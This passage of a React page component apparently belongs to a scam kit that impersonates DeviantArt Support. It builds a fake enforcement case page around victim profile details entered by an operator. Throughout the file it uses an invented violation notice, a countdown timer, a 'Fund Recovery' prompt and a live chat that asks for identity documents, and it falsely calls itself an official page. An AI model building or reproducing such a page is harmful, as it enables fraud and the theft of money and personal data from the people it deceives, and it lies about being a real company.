      if (res.status === 410) return { deleted: true };
      if (!res.ok) throw new Error("Not found");
      return res.json();
    },
  });

  // Initialize timer from server-computed remaining seconds (resumes correctly after refresh)
  useEffect(() => {
    if (data?.case?.timeRemaining != null && timeLeft === null) {
      setTimeLeft(data.case.timeRemaining);
    }
  }, [data]);

  useEffect(() => {
    if (timeLeft === null || timeLeft <= 0) return;
    const timer = setInterval(() => setTimeLeft((t) => Math.max(0, (t ?? 0) - 1)), 1000);
    return () => clearInterval(timer);
  }, [timeLeft === null]);

  useEffect(() => {
    if (data?.deleted || status === "deleted") {
      window.location.href = "https://www.deviantart.com";
    }
  }, [data, status]);

  // Browser tab title: "DeviantArt Case Support | <user's name>"
  useEffect(() => {
    if (!data?.case) return;
    try {
      const p = JSON.parse(data.case.discordData || "{}");
      const name = p.name || p.global_name || p.username;
      document.title = name ? `DeviantArt Support | ${name}` : "DeviantArt Support";
    } catch {
      document.title = "DeviantArt Support";
    }
  }, [data]);

  if (isLoading) {
    return (
      <div className="min-h-screen bg-[#314537] flex items-center justify-center">
        <Loader2 className="w-8 h-8 text-[#00c787] animate-spin" />
      </div>
    );
  }

  if (error || !data?.case) {
    return (
      <div className="min-h-screen bg-[#314537] flex items-center justify-center px-4">
        <div className="text-center">
          <AlertTriangle className="w-16 h-16 text-[#ed4245] mx-auto mb-4" />
          <h1 className="text-2xl font-bold text-[#f3f7f4] mb-2">Case Not Found</h1>
          <p className="text-[#b5c0b7]">This case page does not exist or has been removed.</p>
        </div>
      </div>
    );
  }

  const cas = data.case;

  if (status === "closed") {
    return (
      <div className="min-h-screen bg-[#314537] flex items-center justify-center px-4">
        <div className="text-center max-w-md">
          <div className="w-20 h-20 rounded-full bg-[#faa61a]/10 flex items-center justify-center mx-auto mb-6">
            <Clock className="w-10 h-10 text-[#faa61a]" />
          </div>
          <h1 className="text-2xl font-bold text-[#f3f7f4] mb-3">Session Temporarily Unavailable</h1>
          <p className="text-[#b5c0b7] mb-2">This case page is currently undergoing maintenance.</p>
          <p className="text-[#b5c0b7] text-sm">Case Reference: <span className="font-mono text-[#d0d8d2]">{cas.caseNumber}</span></p>
          <p className="text-[#b5c0b7] text-sm mt-2">Please check back later or contact DeviantArt support directly.</p>
        </div>
      </div>
    );
  }

  // Manual profile entered in the admin dashboard — same JSON column as before,
  // but now { name, avatarUrl, birthdate, location, memberFor }.
  // Fallbacks keep old cases (legacy profile JSON) rendering.
  const profile = JSON.parse(cas.discordData || "{}");
  const displayName = profile.name || profile.global_name || profile.username || "Unknown User";
  const profileAvatar = profile.avatarUrl || "";
  // Per-case background; falls back to the default banner in public/images/
  const profileBg = profile.backgroundUrl || "/images/default-banner.png";
  const memberFor = (profile.memberFor || "").trim();
  const initial = displayName.charAt(0).toUpperCase();
  const createdAt = parseDate(cas.createdAt);

  return (
    <div className="min-h-screen bg-[#314537]">
      <WarningBanner timeLeft={timeLeft ?? 0} />

      <div className="max-w-3xl mx-auto px-4 py-6 pb-24">
        {/* Profile Card */}
        <div className="bg-[#3d5143] border border-[#00c787]/40 rounded-xl overflow-hidden mb-5">
          <div
            className="h-28 sm:h-36 relative"
            style={{ background: "linear-gradient(135deg, #00c78733, #31453722)" }}
          >
            <img
              src={profileBg}
              alt=""
              onError={(e) => { e.currentTarget.style.display = "none"; }}
              className="absolute inset-0 w-full h-full object-cover"
            />
            <div className="absolute inset-0 bg-gradient-to-b from-transparent to-black/40" />
          </div>

          <div className="px-5 pb-5">
            <div className="flex items-start gap-4 -mt-10 mb-4">
              <div className="relative flex-shrink-0 w-20 h-20 rounded-full border-4 border-[#3d5143] bg-[#546858] overflow-hidden flex items-center justify-center">
                <span className="text-2xl font-bold text-[#f3f7f4]">{initial}</span>
                {profileAvatar && (
                  <img
                    src={profileAvatar}
                    alt=""
                    onError={(e) => { e.currentTarget.style.display = "none"; }}
                    className="absolute inset-0 w-full h-full object-cover"
                  />
                )}
              </div>
              <div className="mt-12 min-w-0">
                <h2 className="text-xl font-bold text-[#f3f7f4] leading-tight">{displayName}</h2>
              </div>
            </div>

            {/* ── Detail tiles — icon + value side by side, icons in PROFILE_ICONS above ── */}
            <div className="grid grid-cols-1 sm:grid-cols-3 gap-3 text-sm">
              {[
                { ...PROFILE_ICONS.birthdate, key: "birthdate", value: profile.birthdate || "—" },
                { ...PROFILE_ICONS.location, key: "location", value: profile.location || "—" },
                { ...PROFILE_ICONS.membership, key: "membership", value: memberFor || "—" },
              ].map((item) => (
                <div key={item.key} className="bg-[#546858] rounded-lg px-3 py-2.5 flex items-center gap-2.5">
                  <img
                    src={item.icon}
                    alt=""
                    onError={(e) => {
                      const img = e.currentTarget;
                      if (!img.dataset.fbk) {
                        img.dataset.fbk = "1";
                        img.src = svgUri(DEFAULT_TILE_ICONS[item.key]);
                      }
                    }}
                    style={{ width: item.size, height: item.size }}
                    className="object-contain flex-shrink-0"
                  />
                  <p className="text-[#f3f7f4] text-sm">{item.value}</p>
                </div>
              ))}
            </div>
          </div>
        </div>

        {/* Recovery Option Banner — only when enabled */}
        {cas.recoveryEnabled && (
          <div className="bg-[#00c787]/10 border border-[#00c787]/30 rounded-xl p-4 mb-5 flex items-center justify-between gap-4">
            <div className="flex items-start gap-3">
              <div className="w-9 h-9 bg-[#00c787]/20 rounded-full flex items-center justify-center flex-shrink-0 mt-0.5">
                <RefreshCw className="w-4 h-4 text-[#00c787]" />
              </div>
              <div>
                <p className="text-[#00c787] font-semibold text-sm">Fund Recovery Available</p>
                <p className="text-[#d0d8d2] text-xs mt-0.5 leading-relaxed">
                  DeviantArt Support has enabled a fund recovery program for your case.
                  Click to begin the verification process and recover your funds.
                </p>
              </div>
            </div>
            <button
              onClick={() => setShowRecovery(true)}
              className="flex-shrink-0 bg-[#00c787] hover:bg-[#009b69] text-white px-4 py-2 rounded-[3px] text-sm font-semibold transition-colors whitespace-nowrap"
            >
              Recover Funds
            </button>
          </div>
        )}

        {/* Case Details */}
        <div className="bg-[#3d5143] border border-[#00c787]/40 rounded-xl overflow-hidden mb-5">
          <div className="px-5 py-4 border-b border-[#657768] flex items-center gap-3">
            <FileText className="w-5 h-5 text-[#00c787]" />
            <h3 className="text-[#f3f7f4] font-semibold">Case Details</h3>
            <span className="ml-auto bg-[#ed4245]/20 text-[#ed4245] border border-[#ed4245]/30 text-xs px-2.5 py-0.5 rounded-full font-medium">
              Under Review
            </span>
          </div>
          <div className="p-5 space-y-4">
            <div className="flex items-start gap-3">
              <span className="text-[#b5c0b7] text-xs w-28 flex-shrink-0 pt-0.5">Case Number</span>
              <span className="text-[#f3f7f4] font-mono text-sm font-semibold">{cas.caseNumber}</span>
            </div>
            <div className="flex items-start gap-3">
              <span className="text-[#b5c0b7] text-xs w-28 flex-shrink-0 pt-0.5">Violation</span>
              <span className="text-[#f3f7f4] text-sm">{cas.violation}</span>
            </div>
            <div className="flex items-start gap-3">
              <span className="text-[#b5c0b7] text-xs w-28 flex-shrink-0 pt-0.5">Reason</span>
              <span className="text-[#d0d8d2] text-sm leading-relaxed">{cas.reason}</span>
            </div>
            <div className="flex items-start gap-3">
              <span className="text-[#b5c0b7] text-xs w-28 flex-shrink-0 pt-0.5">Status</span>
              <span className="bg-[#ed4245]/20 text-[#ed4245] border border-[#ed4245]/30 text-xs px-2 py-0.5 rounded-full font-medium">Active Investigation</span>
            </div>
            <div className="flex items-start gap-3">
              <span className="text-[#b5c0b7] text-xs w-28 flex-shrink-0 pt-0.5">Timestamp</span>
              <span className="text-[#d0d8d2] text-sm">{createdAt.toLocaleString()}</span>
            </div>
          </div>
        </div>

        {/* Violation Section */}
        <div className="bg-[#3d5143] border border-[#ed4245]/30 rounded-xl overflow-hidden mb-5">
          <div className="px-5 py-4 border-b border-[#657768] flex items-center gap-3">
            <AlertCircle className="w-5 h-5 text-[#ed4245]" />
            <h3 className="text-[#f3f7f4] font-semibold">Violation Notice</h3>
          </div>
          <div className="p-5">
            <div className="bg-[#ed4245]/10 border border-[#ed4245]/20 rounded-lg p-4 mb-4">
              <div className="flex items-start gap-3">
                <AlertTriangle className="w-5 h-5 text-[#ed4245] flex-shrink-0 mt-0.5" />
                <div>
                  <p className="text-[#ed4245] font-semibold text-sm mb-1">{cas.violation}</p>
                  <p className="text-[#d0d8d2] text-sm leading-relaxed">{cas.reason}</p>
                </div>
              </div>
            </div>
            <div className="space-y-2 text-sm text-[#d0d8d2]">
              <p className="flex items-start gap-2"><span className="text-[#ed4245] mt-0.5">•</span> Your account is currently under review by the DeviantArt Trust & Safety team.</p>
              <p className="flex items-start gap-2"><span className="text-[#ed4245] mt-0.5">•</span> Continued violations may result in permanent suspension or account deletion.</p>
              <p className="flex items-start gap-2"><span className="text-[#ed4245] mt-0.5">•</span> You are required to respond within the session window shown above.</p>
            </div>
          </div>
        </div>

        {/* Timeline */}
        <div className="bg-[#3d5143] border border-[#00c787]/40 rounded-xl overflow-hidden mb-5">
          <div className="px-5 py-4 border-b border-[#657768] flex items-center gap-3">
            <Clock className="w-5 h-5 text-[#00c787]" />
            <h3 className="text-[#f3f7f4] font-semibold">Case History</h3>
          </div>
          <div className="p-5">
            <div className="relative">
              <div className="absolute left-4 top-0 bottom-0 w-px bg-[#657768]" />
              {[
                { label: "Case Created", desc: "Report submitted to DeviantArt Support", date: createdAt.toLocaleString(), color: "bg-[#00c787]" },
                { label: "Under Investigation", desc: "Case assigned to enforcement team", date: createdAt.toLocaleString(), color: "bg-[#faa61a]" },
                { label: "Awaiting Response", desc: "User notification sent — session active", date: new Date().toLocaleString(), color: "bg-[#ed4245]" },
              ].map((event, i) => (
                <div key={i} className="flex items-start gap-4 mb-5 last:mb-0 relative pl-9">
                  <span className={`absolute left-2.5 top-1.5 w-3 h-3 rounded-full ${event.color} border-2 border-[#3d5143] -translate-x-1/2`} />
                  <div>
                    <p className="text-[#f3f7f4] text-sm font-medium">{event.label}</p>
                    <p className="text-[#b5c0b7] text-xs mt-0.5">{event.desc}</p>
                    <p className="text-[#b5c0b7] text-xs mt-1 font-mono">{event.date}</p>
                  </div>
                </div>
              ))}
            </div>
          </div>
        </div>

        {/* How to Appeal */}
        <div className="bg-[#3d5143] border border-[#00c787]/40 rounded-xl overflow-hidden mb-5">
          <div className="px-5 py-4 border-b border-[#657768] flex items-center gap-3">
            <HelpCircle className="w-5 h-5 text-[#00c787]" />
            <h3 className="text-[#f3f7f4] font-semibold">How to Appeal / Resolution Process</h3>
          </div>
          <div className="p-5 space-y-4">
            {[
              { step: "01", title: "Connect to Live Support", desc: "Click the blue chat button in the bottom-right corner to open the live support widget. You will be connected directly to a DeviantArt Support agent." },
              { step: "02", title: "Provide Your Information", desc: "Explain your situation clearly. You may be asked to provide identity verification, account history, or context around the reported content." },
              { step: "03", title: "Submit Any Evidence", desc: "Upload screenshots, receipts, or any supporting documents through the chat window. Our team will review all submitted materials." },
              { step: "04", title: "Await Decision", desc: "Estimated response time: within this session. Complex cases may require up to 24 hours. You will be notified via this page." },
            ].map((s) => (
              <div key={s.step} className="flex items-start gap-4">
                <span className="text-[#00c787] font-mono font-bold text-xs bg-[#00c787]/10 rounded-md px-2 py-1 flex-shrink-0 mt-0.5">{s.step}</span>
                <div>
                  <p className="text-[#f3f7f4] text-sm font-semibold">{s.title}</p>
                  <p className="text-[#b5c0b7] text-sm mt-0.5 leading-relaxed">{s.desc}</p>
                </div>
              </div>
            ))}

            <div className="bg-[#00c787]/10 border border-[#00c787]/20 rounded-lg p-4 mt-2">
              <div className="flex items-center gap-2 mb-2">
                <CheckCircle className="w-4 h-4 text-[#00c787]" />
                <p className="text-[#00c787] font-semibold text-sm">Support is Online</p>
              </div>
              <p className="text-[#d0d8d2] text-sm">A DeviantArt Support agent is available right now. Use the <strong className="text-[#f3f7f4]">live chat widget</strong> in the bottom-right corner to start your appeal immediately.</p>
            </div>
          </div>
        </div>

        {/* Footer */}
        <div className="text-center text-[#b5c0b7] text-xs space-y-1">
          <div className="flex items-center justify-center gap-2">
            <svg viewBox="0 0 24 24" fill="#00c787" className="w-4 h-4">
  <path d="M14.475 2l-.352.355-1.664 3.17-.522.353H6v4.84h3.264l.29.352L6 17.862v3.525h3.525l.352-.354 1.663-3.17.523-.353H18v-4.841h-3.264l-.29-.354L18 5.525V2z" />
</svg>
            <span className="text-[#00c787] font-semibold">DeviantArt Support</span>
          </div>
          <p>This is an official enforcement case page. Case: {cas.caseNumber}</p>
          <p>© {new Date().getFullYear()} DeviantArt. All rights reserved.</p>
        </div>
      </div>

      <ChatWidget slug={slug} caseId={cas.id} />

      {showRecovery && cas.recoveryEnabled && (
        <RecoveryModal slug={slug} cas={cas} onClose={() => setShowRecovery(false)} />
      )}

    </div>
  );
}
